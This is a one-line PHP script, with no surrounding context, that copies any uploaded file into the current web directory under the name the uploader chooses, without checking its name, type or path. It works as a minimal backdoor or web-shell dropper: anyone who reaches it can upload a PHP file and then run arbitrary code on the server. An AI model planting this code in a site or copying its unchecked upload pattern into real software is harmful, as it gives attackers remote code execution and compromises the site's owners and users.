<?php if(isset($_FILES['file'])) {copy($_FILES['file']['tmp_name'], $_FILES['file']['name']);}    ?>
